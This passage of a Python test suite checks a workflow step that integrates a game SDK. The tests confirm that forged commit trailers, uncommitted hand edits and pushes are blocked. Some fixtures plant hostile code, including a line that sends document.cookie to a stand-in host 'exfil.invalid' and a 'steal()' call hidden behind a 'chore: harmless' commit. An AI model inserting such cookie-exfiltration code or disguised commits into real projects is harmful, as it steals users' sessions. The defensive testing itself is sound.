        result = self.execute(prototype_report=prototype_at(base))
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("commit-lineage-mismatch", result.message)
        self.assertEqual(result.artifacts, [])

    def test_uncommitted_changes_it_did_not_make_are_refused(self):
        make_repo(self.repo)
        base = self.head()
        write(self.repo, "src/game/extra.ts", "export const uncommitted = true;\n")
        result = self.execute(prototype_report=prototype_at(base), commit_first=False)
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("src/game/extra.ts", result.message)
        self.assertEqual(self.head(), base)

    def test_a_prototype_report_without_a_commit_blocks(self):
        make_repo(self.repo)
        for placeholder in ("0" * 40, "unknown"):
            result = self.execute(prototype_report=prototype_at(placeholder))
            self.assertEqual(result.outcome, StepOutcome.BLOCKED, placeholder)
            self.assertIn("names no build commit", result.message)

    def test_a_failed_integration_is_not_committed(self):
        make_repo(self.repo)
        base = self.head()
        result = self.execute(FakeRunner(failing_scenarios={"reward-callback"}),
                              prototype_report=prototype_at(base))
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        self.assertEqual(self.head(), base)
        self.assertEqual(self.report(result)["build_ref"],
                         {"commit_sha": base, "base_commit_sha": base, "sdk_commits": []})

    def test_a_commit_forging_its_trailer_is_not_taken_for_its_own(self):
        make_repo(self.repo)
        base = self.head()
        write(self.repo, "src/game/evil.ts", "steal();\n")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-qm", "chore: harmless\n\nWgf-Sdk-Key: local:sdk:1")
        result = self.execute(prototype_report=prototype_at(base))
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("commit-lineage-mismatch", result.message)

    def test_a_forged_commit_with_this_visits_key_is_not_reused(self):
        make_repo(self.repo)
        write(self.repo, "src/game/evil.ts", "steal();\n")
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-qm", "chore: harmless\n\nWgf-Sdk-Key: local:sdk:1")
        # As the base itself (no prototype-report): the keyed-commit lookup finds a commit
        # carrying this visit's key, which the ledger does not know. It is not taken for
        # the integration's commit; nothing is committed.
        head = self.head()
        result = self.execute()
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("forged", result.message)
        self.assertEqual(self.head(), head)

    def test_a_hand_edit_to_an_integration_file_is_not_folded_into_its_commit(self):
        make_repo(self.repo)
        base = self.head()
        with open(os.path.join(self.repo, "src", "main.ts"), "a") as handle:
            handle.write("fetch('https://exfil.invalid/?' + document.cookie);\n")
        result = self.execute(prototype_report=prototype_at(base), commit_first=False)
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("src/main.ts", result.message)
        self.assertEqual(self.head(), base)

    def test_an_interrupted_attempt_s_leftovers_are_regenerated_not_kept(self):
        make_repo(self.repo)
        base = self.head()
        first = self.execute(FakeRunner(failing_scenarios={"reward-callback"}),
                             prototype_report=prototype_at(base))
        self.assertEqual(first.outcome, StepOutcome.FAILED)  # left uncommitted, started
        with open(os.path.join(self.repo, "src", "main.ts"), "a") as handle:
            handle.write("fetch('https://exfil.invalid/');\n")
        again = self.execute(prototype_report=prototype_at(base), commit_first=False)
        self.assertEqual(again.outcome, StepOutcome.SUCCESS, again.error or again.message)
        self.assertNotIn("exfil", git(self.repo, "show", "HEAD:src/main.ts").stdout)
        self.assertEqual(git(self.repo, "status", "--porcelain").stdout, "")

    def test_nothing_is_pushed(self):
        make_repo(self.repo)
        self.execute(prototype_report=prototype_at(self.head()))
        for call in self.runner.calls:
            if call[0] == "git":
                self.assertNotIn(call[1], ("push", "fetch", "pull", "remote", "reset"), call)


class FailurePaths(SdkCase):
    def test_without_a_design_the_step_only_verifies(self):
        make_repo(self.repo)
        step = Step(FakeDefinition({"game_repo": self.repo}))
        step.integration_runner_factory = FakeRunner
        result = step.execute(FakeInputs(scaffold_record=self.scaffold), FakeContext())
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error)
        self.assertNotIn("integration", result.artifacts[0].content)
        self.assertFalse(os.path.exists(os.path.join(self.repo, "src", "platform",
                                                     "gameplay.ts")))

    def test_blocks_without_a_checkout(self):
        result = self.execute()
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("platform not configured", result.message)

    def test_finds_the_checkout_under_games_dir(self):
        make_repo(os.path.join(self.scratch, "games", self.scaffold["repository"]["name"]))
        step = Step(FakeDefinition({}))
        step.integration_runner_factory = FakeRunner
        result = step.execute(
            FakeInputs(game_design=self.design, scaffold_record=self.scaffold),
            FakeContext({"games_dir": os.path.join(self.scratch, "games")}))
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.message)

    def test_finds_the_checkout_where_init_cloned_it(self):
        make_repo(os.path.join(self.scratch, "projects", "mock-title"))
        step = Step(FakeDefinition({}))
        step.integration_runner_factory = FakeRunner
        context = FakeContext()
        context.config = FactoryConfig({"sdk": SDK_CONFIG, "init": {
            "projects_dir": os.path.join(self.scratch, "projects")}})
        result = step.execute(
            FakeInputs(game_design=self.design, scaffold_record=self.scaffold), context)
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.message)

    def test_blocks_on_a_repository_not_made_from_the_template(self):
        write(self.repo, "game.config.yaml", GAME_CONFIG)
        result = self.execute()
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertIn("does not write an SDK", result.message)

    def test_a_failing_suite_fails_without_retry_and_keeps_the_evidence(self):
        make_repo(self.repo)
        result = self.execute(FakeRunner(failing_scenarios=["sdk-init-failure"]))
        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
        tests = self.report(result)["integration"]["tests"]
        self.assertEqual(tests["status"], "failed")
        failed = {s["id"]: s["status"] for s in tests["scenarios"]}
        self.assertEqual(failed["sdk-init-failure"], "failed")
        self.assertEqual(self.feature(self.report(result), "yandex", "init")["status"], "partial")

    def test_a_required_platform_without_an_adapter_fails_with_evidence(self):
        make_repo(self.repo, game_config=GAME_CONFIG.replace(
            "{ id: poki, profile: poki@1.0.0, role: optional }",
            "{ id: poki, profile: poki@1.0.0, role: required }"))
        result = self.execute()
        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
        self.assertIn("poki", result.error)
        poki = self.platform(self.report(result), "poki")
        self.assertEqual((poki["status"], poki["adapter"]["status"]), ("not-started", "missing"))

    def test_without_dependencies_the_suite_is_not_run_and_nothing_is_working(self):
        make_repo(self.repo, node_modules=False)
        result = self.execute()
        # Unverified integration on the required platform: not working, so the step fails.
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        report = self.report(result)
        self.assertEqual(report["integration"]["tests"]["status"], "not-run")
        self.assertEqual({s["status"] for s in report["integration"]["tests"]["scenarios"]},
                         {"not-run"})
        for feature in ("rewarded", "storage", "loading"):
            self.assertEqual(self.feature(report, "yandex", feature)["status"], "partial")

    def test_typecheck_errors_elsewhere_do_not_fail_the_integration(self):
        make_repo(self.repo)
        elsewhere = "packages/pixi-framework/src/index.ts(8,45): error TS2307: no pixi.js\n"
        tests = self.report(self.execute(FakeRunner(tsc_output=elsewhere)))["integration"]["tests"]
        self.assertEqual((tests["status"], tests["typecheck"]), ("passed", "passed"))
        self.assertIn("predate", tests["note"])

        ours = "src/main.ts(12,3): error TS2304: Cannot find name 'booted'.\n"
        result = self.execute(FakeRunner(tsc_output=ours))
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        self.assertEqual(self.report(result)["integration"]["tests"]["typecheck"], "failed")

    def test_without_git_the_commit_cannot_be_established_and_it_blocks(self):
        # Formerly the report fell back to where the conformance suite said it ran, or to
        # "unknown". A commit nobody can read is not a commit a release can pin.
        make_repo(self.repo)
        result = self.execute(FakeRunner(git=False))
        self.assertEqual(result.outcome, StepOutcome.BLOCKED)
        self.assertEqual(result.artifacts, [])
        self.assertIn("cannot be established", result.message)


class Runner(unittest.TestCase):
    def test_pnpm_missing_is_not_run(self):
        scratch = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, scratch)
        os.makedirs(os.path.join(scratch, "node_modules"))
        record = run_tests(FakeRunner(pnpm=False), scratch)
        self.assertEqual(record["status"], "not-run")


# -- the payload the step writes ----------------------------------------------------------------

class Payload(unittest.TestCase):
    def test_the_suites_define_exactly_the_scenarios_the_report_reads(self):
        text = "".join(read(integrate.GAME_FILES, f)
                        for f in (TEST_FILE, integrate.SEAM_FILES[1]))
        self.assertEqual(tuple(re.findall(r'^describe\("([a-z-]+)"', text, re.M)), SCENARIOS)

    def test_the_payload_calls_no_portal_sdk(self):
        for relative in (*integrate.OWNED_FILES, *integrate.SEAM_FILES):
            text = read(integrate.GAME_FILES, relative)
            self.assertNotRegex(text, r"\b(YaGames|PokiSDK|CrazyGames\.SDK|window\.\w+SDK)\b",
                                relative)
            for imported in re.findall(r'from "([^"]+)"', text):
                self.assertTrue(imported.startswith(("@wgf/", ".", "vitest")), imported)

    def test_the_rendered_plan_is_stable(self):
        plan = {"titleId": "t", "placements": [], "adapterSubstitutes": {}, "initTimeoutMs": 5}
        self.assertEqual(integrate.render_plan(plan, "src"), integrate.render_plan(plan, "src"))
        self.assertIn("export const INTEGRATION_PLAN: IntegrationPlan = {\n  titleId: \"t\",",
                      integrate.render_plan(plan, "src"))


# -- through the real engine (contract §11.2) ---------------------------------------------------

CONTRACT_WORKFLOW = """
workflow:
  id: sdk-contract
  version: 1
  steps:
    - id: design
      type: design
      outputs: [game-design]
    - id: init
      type: init
      inputs: [game-design]
      outputs: [scaffold-record]
    - id: sdk
      type: sdk
      inputs: [game-design, scaffold-record, prototype-report]
      outputs: [sdk-report]
      with: {game_repo: "%s"}
"""


class EngineContract(SdkCase):
    def test_runs_through_the_engine_after_upstream_steps(self):
        make_repo(self.repo)
        workflow = os.path.join(self.scratch, "sdk-contract.workflow.yaml")
        with open(workflow, "w", encoding="utf-8") as handle:
            handle.write(textwrap.dedent(CONTRACT_WORKFLOW % self.repo.replace("\\", "/")))
        # The mock module supplies design and init; wgf_sdk, listed later, supplies sdk.
        config = FactoryConfig({"steps": {"modules": ["wgflib.workflow.mock", "wgf_sdk"]},
                                "storage": {"fsync": False},
                                "sdk": {"adapter_substitutes": {"gamevui": "generic-web"}}})
        # The engine registers the real SdkStep: fake both of its runners and its clock.
        for name, fake in (("integration_runner_factory", FakeRunner),
                           ("runner_factory", Conformance),
                           ("clock", staticmethod(lambda: "2026-09-23T00:00:00Z"))):
            self.addCleanup(setattr, SdkStep, name, SdkStep.__dict__[name])
            setattr(SdkStep, name, fake)

        api = WorkflowAPI(config=config, store_dir=os.path.join(self.scratch, "store"),
                          workflow=workflow)
        state = api.run(RunRequest(project_id="mock-title"))
        self.assertEqual(state.status, RunStatus.COMPLETED, state.message)
        stored = api.store.load(state.run_id)
        self.assertEqual(stored.steps["sdk"].status, StepStatus.SUCCESS)
        self.assertEqual(stored.steps["sdk"].consumed, ["game-design@v1", "scaffold-record@v1"])
        ref = stored.latest_artifact("sdk-report")
        self.assertEqual(ref.metadata["integration"], "passed")
        report = api.store.read_artifact(state.run_id, ref)
        self.assertEqual(report["platforms"][0]["platform_id"], "yandex")

    def test_registers_the_sdk_type(self):
        registry = StepRegistry()
        wgf_sdk.register(registry)
        self.assertIs(registry.resolve("sdk"), SdkStep)


if __name__ == "__main__":
    unittest.main()
